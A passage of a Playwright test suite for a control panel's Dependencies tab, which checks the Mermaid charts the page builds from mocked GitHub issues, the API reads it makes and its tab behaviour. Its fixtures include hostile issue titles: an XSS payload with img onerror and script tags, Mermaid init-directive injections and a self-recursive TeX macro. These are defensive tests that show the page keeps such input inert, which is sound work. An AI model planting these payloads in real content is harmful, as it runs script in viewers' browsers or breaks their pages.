// Checks of the control panel's Dependencies tab (site branch claude/graph-section, 2026-10-18; a
// section of the one long page until the page became a console of tabs, site pull request #40)
// against a mocked GitHub API: the chart text the page builds from GitHub's REST objects, byte for
// byte the two blocks the protocol's board writes for the same state (symphony-protocol
// tests/fixtures/board-epics.json and board-epics-STATE.md, copied below) and the block it writes
// for hostile titles, titles that spell a Mermaid directive or its math and titles the board folds
// to ASCII, the reads it makes and the
// ones it never makes, the vendored Mermaid loaded from the site only when there is a chart and
// drawing both charts with their nodes and classes, a tab of its own in the console's rail after
// Tasks, with its ARIA and its address, the charts drawn while the tab is hidden and shown whole
// when it opens, a node pressed in this tab or in the Board tab opening the Tasks tab with the
// task's row centred inside that tab's own box and the window left where it was, the assistant's
// "show dependencies" opening this tab at its first chart, the tables alone when the drawing script
// cannot load, a hostile title inert, each stop said in words with nothing half drawn (a 403, a
// 429, the cap, the rate limit's reserve), nothing drawn without an epic, a Refresh redrawing the
// new count, a goal listed with the epics and not as an other issue, a repository switched
// mid-load, a second page of sub-issues read and counted, pull requests and another repository's
// issues left out, a deleted issue read as none, the repository's record unread, a repository
// renamed, a claim shown by its pull request, one chart that cannot be drawn, the board's own charts
// drawn in the Board tab as the board's own bytes, for titles of every printable character too, and
// only where every line is one the board writes, any other block shown as text that reads on its
// ground, a board whose title opens an HTML comment shown whole, the charts on a ground their edges
// show on, a press on a task the tables do not hold staying in this tab, a draw that reads nothing
// once the open issues' answer says the token is under the reserve, the last repository taken off
// the list and an open list cut short. Each check states what the page promises; a FAIL is a
// defect. Every token is a stand-in.
//
// The console shows one tab at a time, so each check opens the Dependencies tab by its rail button
// before it reads or presses inside it, and console-tabs.mjs opens any other tab a press names, as
// the other suites do. A press that crosses tabs is read right after it with page.evaluate, which
// opens nothing, so the page and not the helper is what opened the tab. The window is a laptop's,
// 1366 x 657, where the console fills the window and the site's foot lies below it, so the page
// could scroll and no press may move it.
//
// The mutants that prove the checks bite are e2e2/mutants/g*.json, each with the checks that must
// catch it (.only) and this file named as its suite (.suite); e2e2/run-mutants.sh runs them.
import { chromium } from 'playwright';
import { consoleTabs } from './console-tabs.mjs';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';

const BASE = process.env.BASE || 'http://127.0.0.1:8077';
const SITE = process.env.SITE || '/home/user/openspineconsortium.github.io';
const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');
const now = new Date().toISOString();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const results = [];
const ONLY = (process.env.ONLY || '').split(',').filter(Boolean);
async function check(name, fn) {
  if (ONLY.length && !ONLY.some((o) => name.startsWith(o + ':'))) return;
  try { await fn(); results.push('PASS ' + name); console.log('PASS', name); }
  catch (e) { results.push('FAIL ' + name + ' :: ' + String(e && e.message || e).split('\n')[0]); console.log('FAIL', name, '\n    ', String(e && e.message || e).split('\n').slice(0, 4).join('\n     ')); }
}

// These checks paste a token, which the page shows open only while the sign-in is off, so the page
// is served the shipped script with its two sign-in constants emptied. A check that needs another
// cap serves its own copy (open's opts.constants).
let script = fs.readFileSync(SITE + '/assets/js/symphony-panel.js', 'utf8');
// A mutant's replacement goes in as written: given as a string, replace() would read "$'" and the
// like in it as patterns, and g01's "['$', ..." put the rest of the script there, so the page broke
// on load and the mutant was caught for that and not for its change.
if (process.env.MUTANT) for (const [a, b] of JSON.parse(fs.readFileSync(process.env.MUTANT, 'utf8'))) { assert.ok(script.includes(a), 'mutant text not found: ' + a.slice(0, 60)); script = script.replace(a, () => b); }
script = script.replace(/var SIGNIN_SERVICE = '[^']*';/, "var SIGNIN_SERVICE = '';").replace(/var CLIENT_ID = '[^']*';/, "var CLIENT_ID = '';");
function withConstants(source, constants) {
  for (const [name, value] of Object.entries(constants)) {
    const line = new RegExp('var ' + name + ' = [0-9]+;');
    assert.ok(line.test(source), 'the constant ' + name + ' was not found in the script');
    source = source.replace(line, 'var ' + name + ' = ' + value + ';');
  }
  return source;
}

const resp = (status, body, extra) => Object.assign({ __r: true, status, body }, extra || {});
const VENDOR = '**/assets/js/vendor/mermaid.min.js*';
// a stand-in for the drawing library that records the text it is handed and draws nothing
const STUB = "window.mermaid = { initialize: function (c) { window.__init = c; }, render: function (id, text) { (window.__charts = window.__charts || []).push(text); return Promise.resolve({ svg: '<svg data-stub=\"1\"></svg>' }); } };";
const stubRoute = [VENDOR, (route) => route.fulfill({ status: 200, contentType: 'application/javascript', body: STUB })];
const missingRoute = [VENDOR, (route) => route.fulfill({ status: 404, contentType: 'text/plain', body: 'gone' })];

// The library's fixture as GitHub's REST objects: the open list (labels as objects, the two summaries
// as GitHub gives them), what GET issues/N/sub_issues and issues/N/dependencies/blocked_by answer, and
// the one issue the open list lacks (#21, closed).
function issue(n, title, labels, extra) {
  return Object.assign({
    number: n, title, state: 'open', html_url: 'https://github.com/acme/demo/issues/' + n, repository_url: 'https://api.github.com/repos/acme/demo',
    labels: labels.map((name) => ({ name })), updated_at: now,
  }, extra || {});
}
const deps = (blocked_by, total_blocked_by) => ({ issue_dependencies_summary: { blocked_by, blocking: 0, total_blocked_by, total_blocking: 0 } });
const subs = (completed, total) => ({ sub_issues_summary: { total, completed, percent_completed: total ? Math.round(100 * completed / total) : 0 } });
function fixture(completed) {
  const i20 = issue(20, 'Draw the board', ['epic'], Object.assign(subs(completed === undefined ? 1 : completed, 3), deps(0, 0)));
  const i21 = issue(21, 'Read the summary', ['todo'], { state: 'closed' });
  const i22 = issue(22, 'Render the section', ['claimed', 'worker:alice'], deps(1, 1));
  const i23 = issue(23, 'Write the body | with "quotes" and <tags> #5 and a title long enough to be cut short', ['todo'], deps(1, 2));
  const i24 = issue(24, 'Write the docs', ['todo', 'worker:bob'], deps(2, 2));
  const i25 = issue(25, 'Fix the build', ['blocker'], deps(1, 1));
  const i30 = issue(30, 'Ship the graph', ['goal', 'todo'], subs(0, 1));
  const i99 = issue(99, 'Settle the colours', ['todo']);
  return {
    open: [i20, i22, i23, i24, i25, i30, i99],
    subIssues: { 20: [i21, i22, i23], 30: [i20] },
    blockedBy: { 22: [i99], 23: [i21, i22] },
  };
}
// The two blocks of tests/fixtures/board-epics-STATE.md at FIXTURE_COMMIT, the fence lines dropped:
// what the page must hand the drawing for the goals and for epic #20. Check A0 compares them with a
// checkout of symphony-protocol where SYMPHONY_PROTOCOL names one, so a change to the library's
// fixture is seen before the page drifts from the board; the commit says where to diff from.
const FIXTURE_COMMIT = '468fc44';
const GOALS_TEXT = [
  'flowchart TD',
  '  i20["#20 Draw the board (1/3)"]',
  '  i30["#30 Ship the graph (0/1)"]:::todo',
  '  i30 ==> i20',
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
].join('\n');
const EPIC_20_TEXT = [
  'flowchart TD',
  '  i21["#21 Read the summary"]:::closed',
  '  i22["#22 Render the section"]:::claimed',
  '  i23["#23 Write the body #124; with #quot;quotes#quot; and #lt;t..."]:::todo',
  '  i99["#99 Settle the colours"]:::todo',
  '  i21 -.-> i23',
  '  i22 --> i23',
  '  i99 --> i22',
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
].join('\n');
const board = '# Board\n\nAs of commit 0123abc on main. Rewritten by .github/workflows/board.yml; do not edit by hand.\n\n## Claims (open claude/<issue> branches and docs/agents/claims/<issue>.md)\n\n| Issue | Branch | Worker | PR | Files it touches |\n| --- | --- | --- | --- | --- |\n| #22 | claude/22 | alice | (no pull request yet) | sdlc_protocol/board.py |\n';

function baseRoutes(repo, tasks) {
  return {
    'GET /user': { login: 'tester' },
    ['GET /repos/' + repo]: { full_name: repo, default_branch: 'main', private: false, topics: ['symphony'], id: 123, owner: { id: 77, login: 'acme' } },
    ['GET /repos/' + repo + '/issues']: tasks || [],
    ['GET /repos/' + repo + '/contents/STATE.md']: { encoding: 'base64', content: b64(board) },
    ['GET /repos/' + repo + '/branches/board']: { commit: { commit: { committer: { date: now } } } },
    ['GET /repos/' + repo + '/contents/.github/symphony/workers']: [],
    ['GET /repos/' + repo + '/actions/runs']: { workflow_runs: [] },
    ['GET /repos/' + repo + '/pulls']: [],
  };
}
// the routes of the fixture's repository: the open list and the four answers the reads get
function fixtureRoutes(f) {
  const routes = baseRoutes('acme/demo', f.open);
  for (const n of Object.keys(f.subIssues)) routes['GET /repos/acme/demo/issues/' + n + '/sub_issues'] = f.subIssues[n];
  for (const n of Object.keys(f.blockedBy)) routes['GET /repos/acme/demo/issues/' + n + '/dependencies/blocked_by'] = f.blockedBy[n];
  return routes;
}
const dependencyReads = (calls) => calls.filter((c) => /^GET \/repos\/[^/]+\/[^/]+\/issues\/[0-9]+\/(sub_issues|dependencies\/blocked_by)$/.test(c.key)).map((c) => c.key);
const writes = (calls) => calls.filter((c) => !/^GET /.test(c.key)).map((c) => c.key);
const EXPECTED_READS = [
  'GET /repos/acme/demo/issues/20/sub_issues',
  'GET /repos/acme/demo/issues/22/dependencies/blocked_by',
  'GET /repos/acme/demo/issues/23/dependencies/blocked_by',
  'GET /repos/acme/demo/issues/30/sub_issues',
];

const browser = await chromium.launch();
await consoleTabs(browser);
// a laptop's window, where the console holds the window and the tabs scroll inside themselves
const VIEW = { width: 1366, height: 657 };
// the mocked API records every call; a route may be a function of the url, the request, the record
// and the route itself, may answer later (delayMs), and answers 204 and 304 with no body; the
// drawing script is served from the site unless a check routes it (opts.extraRoutes); every request
// the page makes, the dialogs it opens and the pages it opens are recorded
async function open(routes, opts) {
  opts = opts || {};
  const served = opts.constants ? withConstants(script, opts.constants) : script;
  const context = await browser.newContext({ viewport: VIEW });
  const calls = [];
  await context.route('https://api.github.com/**', async (route) => {
    const req = route.request();
    const url = new URL(req.url());
    const key = req.method() + ' ' + url.pathname;
    const sent = req.headers();
    const call = { key, url: req.url(), auth: sent['authorization'], body: safeJson(req), at: Date.now() };
    calls.push(call);
    let r = routes[key];
    if (typeof r === 'function') r = r(url, req, call, route);
    if (r && typeof r.then === 'function') r = await r;
    const headers = { 'Access-Control-Expose-Headers': 'ETag, Link' };
    if (r === undefined) return route.fulfill({ status: 404, contentType: 'application/json', headers, body: JSON.stringify({ message: 'Not Found' }) });
    const spec = (r && r.__r) ? r : { status: 200, body: r };
    if (spec.delayMs) await sleep(spec.delayMs);
    Object.assign(headers, spec.headers || {});
    if (/raw\+json/.test(sent['accept'] || '') && spec.body && spec.body.encoding === 'base64') {
      return route.fulfill({ status: spec.status, contentType: 'application/vnd.github.raw+json', headers, body: Buffer.from(spec.body.content, 'base64').toString('utf8') });
    }
    if (spec.status === 204 || spec.status === 304) return route.fulfill({ status: spec.status, headers, body: '' });
    return route.fulfill({ status: spec.status, contentType: 'application/json', headers, body: JSON.stringify(spec.body) });
  });
  await context.route('**/assets/js/symphony-panel.js*', (route) => route.fulfill({ status: 200, contentType: 'application/javascript', body: served }));
  if (process.env.NOCSS) await context.route('**/assets/css/control.css*', (route) => route.fulfill({ status: 200, contentType: 'text/css', body: withoutGround() }));
  if (opts.extraRoutes) for (const [pattern, handler] of opts.extraRoutes) await context.route(pattern, handler);
  // every scrollIntoView the page makes, so a check can tell what it centred
  await context.addInitScript(() => {
    window.__scrolled = [];
    const original = Element.prototype.scrollIntoView;
    Element.prototype.scrollIntoView = function () {
      window.__scrolled.push(this.tagName + ':' + (this.textContent || '').trim().slice(0, 40));
      return original.apply(this, arguments);
    };
  });
  const page = await context.newPage();
  // every page opened after this one, such as a tab a press opens, which comes a moment after the
  // press
  const opened = [];
  context.on('page', (p) => opened.push(p));
  const errors = [], requests = [], dialogs = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  page.on('console', (m) => { if (m.type() === 'error' && !/Failed to load resource/.test(m.text())) errors.push(m.text()); });
  page.on('request', (r) => requests.push(r.url()));
  page.on('dialog', async (d) => { dialogs.push(d.type() + ': ' + d.message()); await d.dismiss(); });
  await page.goto(BASE + '/symphony/control/');
  await page.evaluate((s) => { localStorage.clear(); sessionStorage.clear(); for (const k in s) localStorage.setItem(k, s[k]); }, opts.storage || {});
  await page.goto(BASE + (opts.path || '/symphony/control/?repo=acme/demo'));
  return { context, page, calls, errors, requests, dialogs, opened };
}
function safeJson(req) { try { return req.postDataJSON(); } catch (e) { return req.postData(); } }
// With NOCSS set, the site's stylesheet is served without the rule that gives a chart its light
// ground inside the dark console, so a run can show that C and R fail without it (the mutants
// change only the script).
const GROUND_RULE = '.console .control__chart { background: #FBFAF4; color: #1A1C18; }';
function withoutGround() {
  const css = fs.readFileSync(SITE + '/assets/css/control.css', 'utf8');
  assert.ok(css.includes(GROUND_RULE), 'the chart ground rule was not found in the stylesheet');
  return css.replace(GROUND_RULE, '');
}
// signs in with the pasted token and opens the tab named, the Dependencies tab unless a check wants
// to stay where the console opened (null)
async function signIn(page, tab) {
  await page.fill('#cp-token', 'github_pat_TEST');
  await page.click('#cp-open');
  await page.waitForSelector('#cp-app:not(.hidden)', { timeout: 8000 });
  if (tab !== null) await toTab(page, tab || 'dependencies');
}
// a tab opened as a person opens it, by its rail button
async function toTab(page, name) {
  await page.click('#rail-' + name);
  await page.waitForFunction((n) => !document.getElementById('tab-' + n).hidden && location.hash === '#' + n, name, { timeout: 8000 });
}
// where the console stands, read without opening anything: the address, the tabs shown, the window's
// offset, and whether the page could scroll at all, which is what makes an offset of 0 mean something.
// The console page fits the window and does not scroll since the layout of site #60 (the owner asked
// not to scroll past it to the site's foot), so the check gives the page room below it, a block of its
// own and the body let scroll, for a window that moved to show up as an offset.
const where = (page) => page.evaluate(() => {
  if (!document.getElementById('check-room')) {
    const room = document.createElement('div');
    room.id = 'check-room';
    room.style.height = '150vh';
    document.body.appendChild(room);
    document.body.style.overflow = 'visible';
  }
  return {
  hash: location.hash,
  shown: Array.from(document.querySelectorAll('[data-tab-panel]')).filter((p) => !p.hidden).map((p) => p.getAttribute('data-tab-panel')),
  y: window.pageYOffset,
  scrollable: document.documentElement.scrollHeight > window.innerHeight,
  };
});
// whether a node lies wholly inside the box its tab scrolls, and that box inside the window
const inBox = (page, selector) => page.$eval(selector, (node) => {
  const box = node.closest('.console__scroll');
  if (!box) return 'in no tab\'s box';
  const a = node.getBoundingClientRect(), b = box.getBoundingClientRect();
  if (!(a.height > 0)) return 'not drawn';
  if (a.top < b.top - 1 || a.bottom > b.bottom + 1) return 'outside its box: ' + Math.round(a.top) + '..' + Math.round(a.bottom) + ' against ' + Math.round(b.top) + '..' + Math.round(b.bottom);
  if (b.bottom > window.innerHeight + 1) return 'its box runs past the window';
  return 'in view';
});
// the page's message line, outside every tab, which every tab shows
const msgText = (page) => page.textContent('#msg');
const stateText = (page) => page.textContent('#cp-graph-state');
const waitGraph = (page, re, timeout) => page.waitForFunction((src) => new RegExp(src).test(document.getElementById('cp-graph-state').textContent), re.source, { timeout: timeout || 8000 });
const vendorLoads = (requests) => requests.filter((u) => /\/assets\/js\/vendor\/mermaid\.min\.js/.test(u)).length;
const headings = (page) => page.$$eval('#cp-graph h3', (hs) => hs.map((h) => h.textContent));
// for each node the selector names, the contrast against the ground it sits on (the nearest box,
// itself first, with a colour of its own) of its own words and, where it holds a drawn chart, of
// the chart's first edge and first arrowhead, as WCAG's relative luminance gives it; a ratio, not a
// colour, so the console's shades may change
const contrastOf = (page, selector) => page.$$eval(selector, (nodes) => {
  const rgb = (c) => { const m = /rgba?\(([^)]+)\)/.exec(c || ''); return m ? m[1].split(',').map((x) => parseFloat(x)) : null; };
  const lum = (c) => [0, 1, 2].map((i) => { const v = c[i] / 255; return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4); }).reduce((sum, v, i) => sum + v * [0.2126, 0.7152, 0.0722][i], 0);
  const ratio = (a, b) => (a && b) ? Math.round(100 * (Math.max(lum(a), lum(b)) + 0.05) / (Math.min(lum(a), lum(b)) + 0.05)) / 100 : 0;
  const ground = (node) => { for (let n = node; n; n = n.parentElement) { const c = rgb(getComputedStyle(n).backgroundColor); if (c && (c.length < 4 || c[3] > 0)) return c; } return [255, 255, 255]; };
  const paint = (node, prop) => { if (!node) return null; const v = getComputedStyle(node)[prop]; return v && v !== 'none' ? rgb(v) : null; };
  return nodes.map((h) => {
    const g = ground(h), seen = { tag: h.tagName, ground: g, words: ratio(rgb(getComputedStyle(h).color), g) };
    if (!h.querySelector('svg')) return seen;
    const edge = h.querySelector('.edgePaths path'), arrow = h.querySelector('marker path');
    return Object.assign(seen, { edge: ratio(paint(edge, 'stroke'), g), arrow: ratio(paint(arrow, 'fill') || paint(arrow, 'stroke'), g) });
  });
});
// for each drawn chart in a box, its edges', its arrowheads' and its host's own words' contrast
const chartContrast = (page, scope) => contrastOf(page, scope + ' .control__chart').then((seen) => seen.filter((c) => 'edge' in c));
// the edges and arrowheads show on their ground (3 to 1, WCAG's floor for a graphic), and the host's
// own words, "Drawing the chart..." and a failure, read on it (4.5 to 1)
function assertContrast(seen) {
  assert.ok(seen.length > 0, 'no drawn chart to measure');
  for (const c of seen) {
    assert.ok(c.edge >= 3 && c.arrow >= 3, 'a chart\'s edges or arrowheads barely show on its ground: ' + JSON.stringify(c));
    assert.ok(c.words >= 4.5, 'a chart\'s own words barely read on its ground: ' + JSON.stringify(c));
  }
}

// the fenced Mermaid blocks of a board's text, the fences dropped
const mermaidBlocks = (text) => [...text.matchAll(/^```mermaid\n([\s\S]*?)\n```$/gm)].map((m) => m[1]);
if (process.env.SYMPHONY_PROTOCOL) {
  await check('A0: the pasted blocks are the library fixture\'s own, as the checkout named holds them', async () => {
    const golden = fs.readFileSync(process.env.SYMPHONY_PROTOCOL + '/tests/fixtures/board-epics-STATE.md', 'utf8');
    assert.deepEqual(mermaidBlocks(golden), [GOALS_TEXT, EPIC_20_TEXT], 'the library\'s fixture moved since ' + FIXTURE_COMMIT + ': paste its blocks again');
  });
} else console.log('SKIP A0: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted blocks are from ' + FIXTURE_COMMIT);

// Check F's epic #41: a hostile title, four that spell a Mermaid directive, %%{ ... }%%, which
// Mermaid looks for anywhere in the text before it reads the entities, two holding $$...$$, which
// Mermaid typesets as math and which stopped the whole chart from drawing where the formula did not
// parse, and four the board folds to ASCII, among them the small and fullwidth percent and dollar
// signs that the fold turns into the plain ones before they are written as entities. The board
// writes "%" as #37; since symphony-protocol 34c5586 and "$" as #36; since 468fc44, as the page's
// graphLabel does, so the block below is what the library at FIXTURE_COMMIT writes for these titles
// (board.mermaid_block over them, all labelled todo, with no relation), and check A1 renders it
// again with the checkout named.
const HOSTILE = '<img src=x onerror=alert(1)> "] <script>alert(2)</script> and more';
const PERCENT_TITLES = { 43: '%%{init:{ broken', 44: '%%{init:{"theme":"dark"}}%% x', 45: 'Opens %%{init', 46: 'closes it }%% later' };
const DOLLAR_TITLES = { 47: '$$\\def\\x{\\x\\x}\\x$$', 48: 'Pay $$5 or $$ more' };
// each title the board folds, and the text its node shows once Mermaid has read the entities
const FOLDED_TITLES = {
  49: ['Caf\u00e9 na\u00efve \u2460 \ufb01le', '#49 Cafe naive 1 file'],
  51: ['a \uff05\uff05{init} \ufe6a b \uff04\uff04x\ufe69\ufe69', '#51 a %%{init} % b $$x$$'],
  52: ['\u65e5\u672c \u2163 x y z', '#52 IV x y z'],
  53: ['e\u0301\u0301 \u00c5', '#53 e A'],
};
const F_TITLES = Object.assign({ 42: HOSTILE }, PERCENT_TITLES, DOLLAR_TITLES, Object.fromEntries(Object.entries(FOLDED_TITLES).map(([n, t]) => [n, t[0]])));
const F_EPIC_41_TEXT = [
  'flowchart TD',
  '  i42["#42 #lt;img src=x onerror=alert(1)#gt; #quot;] #lt;scri..."]:::todo',
  '  i43["#43 #37;#37;{init:{ broken"]:::todo',
  '  i44["#44 #37;#37;{init:{#quot;theme#quot;:#quot;dark#quot;}}#37;#37; x"]:::todo',
  '  i45["#45 Opens #37;#37;{init"]:::todo',
  '  i46["#46 closes it }#37;#37; later"]:::todo',
  '  i47["#47 #36;#36;\\def\\x{\\x\\x}\\x#36;#36;"]:::todo',
  '  i48["#48 Pay #36;#36;5 or #36;#36; more"]:::todo',
  '  i49["#49 Cafe naive 1 file"]:::todo',
  '  i51["#51 a #37;#37;{init} #37; b #36;#36;x#36;#36;"]:::todo',
  '  i52["#52 IV x y z"]:::todo',
  '  i53["#53 e A"]:::todo',
  '  classDef todo fill:#ffffff,stroke:#0e8a16,color:#000000',
  '  classDef claimed fill:#fff8d6,stroke:#fbca04,color:#000000',
  '  classDef review fill:#e3f0ff,stroke:#1d76db,color:#000000',
  '  classDef blocked fill:#ffe7e7,stroke:#e99695,color:#000000',
  '  classDef closed fill:#eeeeee,stroke:#999999,color:#666666',
].join('\n');
// the block the library checkout named writes for the issues given, number to title, labels, state
// and the sub-issues' progress: board.mermaid_block over them, with no relation
function libraryBlock(issues) {
  const code = 'import json, sys\nfrom sdlc_protocol import board\nspec = json.loads(sys.argv[1])\n' +
    'print(board.mermaid_block([board.Issue(int(n), s["title"], labels=s["labels"], state=s.get("state", "open"), progress=tuple(s["progress"]) if s.get("progress") else None) for n, s in spec.items()], [], set()))\n';
  const out = execFileSync('python3', ['-c', code, JSON.stringify(issues)], { cwd: process.env.SYMPHONY_PROTOCOL, encoding: 'utf8' });
  return mermaidBlocks(out.trimEnd());
}
if (process.env.SYMPHONY_PROTOCOL) {
  await check('A1: the block pasted for check F\'s titles is the library\'s own, as the checkout named renders it', async () => {
    const issues = Object.fromEntries(Object.entries(F_TITLES).map(([n, title]) => [n, { title, labels: ['todo'] }]));
    assert.deepEqual(libraryBlock(issues), [F_EPIC_41_TEXT], 'the library writes these titles otherwise since ' + FIXTURE_COMMIT + ': paste its block again');
  });
} else console.log('SKIP A1: SYMPHONY_PROTOCOL names no checkout of symphony-protocol; the pasted block is from ' + FIXTURE_COMMIT);

await check('A: the chart text handed to the drawing is byte for byte the board\'s two blocks for the fixture', async () => {
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  const charts = await page.evaluate(() => window.__charts);
  const init = await page.evaluate(() => window.__init);
  console.log('     charts handed:', charts.length, '| headings:', JSON.stringify(await headings(page)), '| init:', JSON.stringify(init));
  assert.deepEqual(charts, [GOALS_TEXT, EPIC_20_TEXT]);
  assert.deepEqual(await headings(page), ['Goals', 'Epic #20: Draw the board (1/3)']);
  assert.equal(init.securityLevel, 'strict');
  assert.equal(init.startOnLoad, false);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('B: exactly one sub_issues read per open epic or goal with sub-issues, one blocked_by read per sub-issue of an epic whose summary counts a blocker, and nothing written', async () => {
  const f = fixture();
  // an epic whose summary says no sub-issue owes no read; a goal's children, the epics, get no blocked_by read
  f.open.push(issue(40, 'An epic with nothing under it yet', ['epic'], subs(0, 0)));
  const { context, page, calls, errors } = await open(fixtureRoutes(f), { extraRoutes: [stubRoute] });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/);
  await sleep(500);
  console.log('     reads:', JSON.stringify(dependencyReads(calls)), '| writes:', JSON.stringify(writes(calls)));
  assert.deepEqual(dependencyReads(calls), EXPECTED_READS);
  assert.deepEqual(writes(calls), []);
  for (const c of calls) assert.equal(c.auth, 'Bearer github_pat_TEST', 'a call without the token: ' + c.key);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('C: the vendored Mermaid, loaded once from the site, draws both charts with their nodes and classes while the tab is hidden, and they show whole once it opens', async () => {
  const { context, page, errors, requests } = await open(fixtureRoutes(fixture()));
  // the console opens on its first tab, so the charts are drawn into the hidden Dependencies tab
  await signIn(page, null);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  const drawnHidden = await page.evaluate(() => document.getElementById('tab-dependencies').hidden);
  await toTab(page, 'dependencies');
  const svgs = await page.$$eval('#cp-graph .control__chart svg', (list) => list.map((svg) => ({
    nodes: Array.from(svg.querySelectorAll('g.node')).map((g) => {
      const label = g.querySelector('foreignObject, text');
      return { id: g.id, classes: g.getAttribute('class'), text: g.textContent.trim(), width: g.getBoundingClientRect().width, labelWidth: label ? label.getBoundingClientRect().width : 0 };
    }),
    edges: svg.querySelectorAll('.edgePaths path').length,
    minWidth: svg.style.minWidth,
    size: [svg.getBoundingClientRect().width, svg.getBoundingClientRect().height],
  })));
  console.log('     drawn while hidden:', drawnHidden, '| vendor loads:', vendorLoads(requests), '| charts:', svgs.length, '| nodes:', svgs.map((s) => s.nodes.length).join(','), '| sizes:', JSON.stringify(svgs.map((s) => s.size.map(Math.round))), '| first node:', JSON.stringify(svgs[0] && svgs[0].nodes[0]));
  assert.equal(drawnHidden, true, 'the tab was open while the charts were drawn, so this check says nothing of a hidden one');
  assert.ok(svgs.every((s) => s.size[0] > 0 && s.size[1] > 0), 'a chart has no size once its tab opens: ' + JSON.stringify(svgs.map((s) => s.size)));
  assert.ok(svgs.every((s) => s.nodes.every((n) => n.width > 0 && n.labelWidth > 0)), 'a node or its label was laid out with no width: ' + JSON.stringify(svgs.map((s) => s.nodes.map((n) => [n.id, n.width, n.labelWidth]))));
  assert.equal(vendorLoads(requests), 1);
  assert.equal(svgs.length, 2);
  assert.equal(svgs[0].nodes.length, 2);
  assert.equal(svgs[1].nodes.length, 4);
  assert.equal(svgs[0].edges, 1);
  assert.equal(svgs[1].edges, 3);
  const byNumber = (nodes, n) => nodes.find((x) => new RegExp('-flowchart-i' + n + '-[0-9]+$').test(x.id));
  assert.match(byNumber(svgs[0].nodes, 30).classes, /\btodo\b/);
  assert.ok(!/\b(todo|claimed|review|blocked|closed)\b/.test(byNumber(svgs[0].nodes, 20).classes), 'the epic under its goal is drawn plain: ' + byNumber(svgs[0].nodes, 20).classes);
  assert.match(byNumber(svgs[1].nodes, 21).classes, /\bclosed\b/);
  assert.match(byNumber(svgs[1].nodes, 22).classes, /\bclaimed\b/);
  assert.match(byNumber(svgs[1].nodes, 23).classes, /\btodo\b/);
  assert.equal(byNumber(svgs[1].nodes, 23).text, '#23 Write the body | with "quotes" and <t...');
  assert.equal(byNumber(svgs[0].nodes, 20).text, '#20 Draw the board (1/3)');
  assert.ok(svgs.every((s) => /px$/.test(s.minWidth)), 'a chart keeps its own width: ' + svgs.map((s) => s.minWidth));
  // the console is dark and Mermaid draws its edges dark, so the charts need a light ground of their own
  const contrast = await chartContrast(page, '#cp-graph');
  console.log('     contrast on the ground:', JSON.stringify(contrast));
  assertContrast(contrast);
  assert.deepEqual(errors, []);
  await context.close();
});

await check('D: a node pressed opens the Tasks tab with the task\'s row centred and marked inside that tab\'s box, says so on the message line, leaves the window where it was, and opens nothing', async () => {
  const { context, page, errors, opened } = await open(fixtureRoutes(fixture()));
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await page.evaluate(() => { window.__scrolled.length = 0; });
  const before = await where(page);
  assert.deepEqual([before.hash, before.shown, before.y], ['#dependencies', ['dependencies'], 0]);
  assert.ok(before.scrollable, 'the page fits the window, so the window staying at 0 proves nothing');
  await page.click('#cp-graph g.node[id*="-flowchart-i22-"]');
  // read at once, before any call that would open a tab itself
  const after = await where(page);
  await sleep(800);
  const settled = await where(page);
  const view = await inBox(page, '#cp-claimed tr[data-number="22"]');
  console.log('     before:', JSON.stringify(before), '| after the press:', JSON.stringify(after), '| a moment later:', settled.y, '| row:', view);
  assert.deepEqual([after.hash, after.shown, after.y], ['#tasks', ['tasks'], 0], 'the press did not open the Tasks tab alone, or moved the window');
  assert.equal(settled.y, 0, 'the window moved once the press settled');
  assert.equal(view, 'in view');
  await page.waitForSelector('#cp-claimed tr[data-number="22"].control__focus', { timeout: 8000 });
  const said = await page.textContent('#cp-graph-said');
  const scrolled = await page.evaluate(() => window.__scrolled);
  console.log('     said:', said, '| message line:', await msgText(page), '| scrolled:', JSON.stringify(scrolled), '| pages:', context.pages().length, '| the page could scroll:', before.scrollable);
  assert.equal(said, 'Focused #22 (under Claimed).');
  // the said line is in the Dependencies tab, which the press hid, and the words are on the message line too
  assert.equal(await msgText(page), 'Focused #22 (under Claimed).');
  assert.ok(scrolled.some((s) => /^TR:#22/.test(s)), 'the row was not centred: ' + JSON.stringify(scrolled));
  assert.deepEqual(opened.map((p) => p.url()), []);
  assert.equal(context.pages().length, 1);
  assert.equal(await page.$$eval('#cp-app tr.control__focus', (rows) => rows.length), 1);
  // Centre its row, the button under the chart, does the same for a browsing Claude, from the
  // Dependencies tab opened again by its rail button
  await toTab(page, 'dependencies');
  await page.click('#cp-graph tr:has(a[href$="/issues/23"]) button');
  const centred = await where(page);
  await sleep(800);
  const centredLater = await where(page);
  const view23 = await inBox(page, '#cp-queue tr[data-number="23"]');
  console.log('     after Centre its row:', JSON.stringify(centred), '| a moment later:', centredLater.y, '| row:', view23);
  assert.deepEqual([centred.hash, centred.shown, centred.y, centredLater.y], ['#tasks', ['tasks'], 0, 0]);
  assert.equal(view23, 'in view');
  await page.waitForFunction(() => /#23/.test(document.getElementById('cp-graph-said').textContent), null, { timeout: 8000 });
